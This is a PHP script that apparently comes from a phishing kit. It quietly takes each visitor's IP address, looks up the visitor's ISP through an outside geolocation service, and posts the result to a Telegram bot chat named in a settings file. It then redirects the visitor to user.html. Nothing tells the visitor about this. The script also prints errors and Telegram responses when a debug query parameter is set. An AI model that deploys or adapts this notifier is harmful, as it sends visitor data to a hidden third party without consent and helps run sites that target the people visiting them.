<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

require_once __DIR__ . '/settings/settings-visitor.php';

$debug = isset($_GET['debug']) && $_GET['debug'] === '1';

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ipList[0]);
    } else {
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
    }
    return preg_replace('/[^0-9a-fA-F\:\.\, ]/', '', $ip);
}

function tg_html_escape($text) {
    return str_replace(['&','<','>'], ['&amp;','&lt;','&gt;'], $text);
}

$ip = getUserIP();

// IP Geolocation + ASN operator
$geo_as = "Unknown";
$geo_response = @file_get_contents("http://ip-api.com/json/" . urlencode($ip) . "?fields=status,as");
if ($geo_response !== false) {
    $geo_data = json_decode($geo_response, true);
    if (!empty($geo_data["status"]) && $geo_data["status"] === "success") {
        $full_as = $geo_data["as"] ?? "Unknown";
        // Rimuovi il codice iniziale ASXXXX
        $geo_as = preg_replace('/^AS[0-9]+\s*/', '', $full_as);
    }
}

$messageLines = [];
$messageLines[] = "ISP: " . tg_html_escape($geo_as);
$message = implode("\n", $messageLines);

if (empty($bot_token) || empty($chat_id)) {
    if ($debug) echo "Error: bot token or chat id missing.";
    error_log("Telegram notify: settings missing");
    header("Location: user.html");
    exit();
}

$apiURL = "https://api.telegram.org/bot" . urlencode($bot_token) . "/sendMessage";
$postFields = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $apiURL);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$response = curl_exec($ch);
$curlErrNo = curl_errno($ch);
$curlErr   = curl_error($ch);
$httpCode  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$ok = false;
if ($response !== false) {
    $tgResp = @json_decode($response, true);
    if (is_array($tgResp) && !empty($tgResp['ok'])) $ok = true;
}

if ($debug) {
    echo $ok ? "Telegram OK<br><pre>$response</pre>" : "Telegram error: HTTP:$httpCode CURL:$curlErrNo ($curlErr)<br><pre>$response</pre>";
}

header("Location: user.html");
exit();
?>
